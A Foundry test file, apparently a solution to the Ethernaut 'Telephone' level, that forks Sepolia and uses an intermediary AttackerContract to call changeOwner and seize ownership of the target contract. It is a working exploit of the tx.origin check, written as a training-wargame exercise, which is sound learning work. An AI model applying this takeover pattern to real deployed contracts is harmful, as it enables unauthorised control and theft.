// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Telephone.sol";

contract Level4 is Test {
    Telephone telephone = Telephone(0x3f80f4966E2abc674cd8F1A817bB4D5B46663d35);
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"), 4546931);
        vm.startPrank(attacker);
    }

    function testLevel4() public {
        AttackerContract attackContract = new AttackerContract();
        attackContract.attack();
        assertEq(attacker, telephone.owner());
    }
}

contract AttackerContract {
    Telephone telephone = Telephone(0x3f80f4966E2abc674cd8F1A817bB4D5B46663d35);
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function attack() public {
        telephone.changeOwner(attacker);
    }
}
